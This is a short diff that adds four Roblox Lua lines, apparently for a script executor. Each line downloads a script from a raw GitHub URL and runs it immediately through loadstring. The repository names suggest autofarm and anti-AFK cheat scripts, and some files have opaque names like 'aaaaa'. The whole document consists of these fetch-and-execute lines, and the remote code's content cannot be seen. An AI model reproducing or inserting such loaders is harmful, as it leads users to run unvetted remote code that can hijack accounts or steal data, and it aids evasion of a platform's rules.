@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagAutofarm"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BotSecurity/Antiafk/main/antiafk"))()
+loadstring(game:httpGet("https://raw.githubusercontent.com/BotSecurity/Antiafk/main/roblox"))()
+loadstring(game:httpGet("https://raw.githubusercontent.com/BotSecurity/Antiafk/main/aaaaa"))()
